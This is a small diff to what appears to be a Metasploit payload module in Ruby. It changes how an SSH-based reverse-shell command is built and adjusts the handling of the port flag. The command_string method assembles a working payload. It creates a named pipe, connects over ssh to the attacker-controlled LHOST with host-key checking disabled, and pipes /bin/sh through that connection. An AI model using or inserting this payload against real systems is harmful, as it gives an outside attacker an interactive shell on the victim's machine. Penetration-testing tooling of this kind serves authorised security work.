@@ -32,7 +32,7 @@ module MetasploitModule
       [
         Msf::OptString.new('SshClientOptions', [
           false,
-          "Space separated options to pass to the SSH connection",
+          "Space separated options for the ssh client",
           'UserKnownHostsFile=/dev/null StrictHostKeyChecking=no'
         ])
       ]
@@ -51,7 +51,8 @@ module MetasploitModule
   #
   def command_string
     backpipe = Rex::Text.rand_text_alpha_lower(4+rand(4))
+    lport = datastore['LPORT'] == 22 ? '' : "-P #{datastore['LPORT']} "
     opts =  datastore['SshClientOptions'].blank? ? '' : datastore['SshClientOptions'].split(' ').compact.map {|e| e = "-o #{e} " }.join
-    "mkfifo /tmp/#{backpipe};ssh #{opts}#{datastore['LHOST']} -P #{datastore['LPORT']} 0</tmp/#{backpipe}|/bin/sh >/tmp/#{backpipe} 2>&1;rm /tmp/#{backpipe}"
+    "mkfifo /tmp/#{backpipe};ssh #{opts}#{datastore['LHOST']} #{lport}0</tmp/#{backpipe}|/bin/sh >/tmp/#{backpipe} 2>&1;rm /tmp/#{backpipe}"
   end
 end
